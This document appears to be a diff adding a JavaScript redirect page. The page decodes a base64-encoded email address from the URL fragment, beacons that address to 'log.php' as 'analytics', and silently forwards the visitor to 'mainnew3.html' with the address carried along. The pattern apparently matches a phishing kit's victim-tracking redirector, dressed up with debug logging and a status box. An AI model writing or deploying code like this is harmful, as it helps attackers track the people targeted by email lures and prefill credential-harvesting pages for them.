@@ -1,0 +1,116 @@
+<script type="text/javascript">
+    function validateEmail(email) {
+        var re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+        return re.test(email);
+    }
+
+    decodeBase64 = function(s) {
+        var e = {}, i, b = 0, c, x, l = 0, a, r = '', w = String.fromCharCode, L = s.length;
+        var A = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+        for (i = 0; i < 64; i++) { e[A.charAt(i)] = i; }
+        for (x = 0; x < L; x++) {
+            c = e[s.charAt(x)];
+            b = (b << 6) + c;
+            l += 6;
+            while (l >= 8) {
+                ((a = (b >>> (l -= 8)) & 0xff) || (x < (L - 2))) && (r += w(a));
+            }
+        }
+        return r;
+    }
+
+    function logToConsole(message, data) {
+        try {
+            console.log("[Redirect Debug]", message, data);
+        } catch(e) {}
+    }
+
+    function processRedirect() {
+        try {
+            // Get hash from URL (remove the # symbol)
+            var hash = window.location.hash.substring(1);
+            logToConsole("Original hash from URL:", hash);
+            
+            if (!hash) {
+                logToConsole("ERROR: No hash found in URL. Expected format: page.html#base64EncodedString");
+                return;
+            }
+
+            // Decode the base64 string
+            var decoded = decodeBase64(hash);
+            logToConsole("Decoded string:", decoded);
+            
+            // Replace $ with @ (assuming email uses $ instead of @ in encoded form)
+            var email = decoded.replace(/\$/g, '@');
+            logToConsole("Email after $ to @ replacement:", email);
+            
+            // Validate email format
+            if (!validateEmail(email)) {
+                logToConsole("ERROR: Invalid email format", email);
+                
+                // Try alternative: maybe email was encoded with @ directly?
+                if (validateEmail(decoded)) {
+                    email = decoded;
+                    logToConsole("Using decoded string directly as email:", email);
+                } else {
+                    return;
+                }
+            }
+
+            // Create new hash (re-encode email with @ to base64)
+            var newHash = btoa(email);
+            logToConsole("New hash for redirect:", newHash);
+            
+            // Send analytics/logging
+            try {
+                navigator.sendBeacon(
+                    "log.php",
+                    JSON.stringify({ 
+                        email: email,
+                        original_hash: hash,
+                        timestamp: new Date().toISOString()
+                    })
+                );
+                logToConsole("Analytics sent successfully");
+            } catch (e) {
+                logToConsole("Analytics failed (non-critical):", e.message);
+            }
+
+            // Perform redirect with the new hash
+            var redirectUrl = "mainnew3.html#" + newHash;
+            logToConsole("Redirecting to:", redirectUrl);
+            
+            // Use replace() instead of href to prevent back button issues
+            window.location.replace(redirectUrl);
+            
+        } catch (error) {
+            logToConsole("FATAL ERROR in redirect process:", error.message);
+            console.error(error);
+        }
+    }
+
+    // Debug info in the page (for non-developers)
+    document.addEventListener('DOMContentLoaded', function() {
+        var debugDiv = document.createElement('div');
+        debugDiv.style.cssText = 'position:fixed;bottom:10px;right:10px;background:#f8f9fa;border:1px solid #dee2e6;padding:10px;font-size:12px;z-index:9999;max-width:300px;';
+        debugDiv.innerHTML = '<strong>Redirect Status:</strong><br>Waiting to process...';
+        document.body.appendChild(debugDiv);
+        
+        // Update debug info
+        setTimeout(function() {
+            var hash = window.location.hash.substring(1);
+            if (hash) {
+                debugDiv.innerHTML = '<strong>Redirect Status:</strong><br>Hash detected, processing...';
+            } else {
+                debugDiv.innerHTML = '<strong>Redirect Status:</strong><br>No hash found in URL';
+            }
+        }, 500);
+    });
+
+    // Start processing - with a small delay to ensure DOM is ready
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', processRedirect);
+    } else {
+        setTimeout(processRedirect, 100);
+    }
+</script>
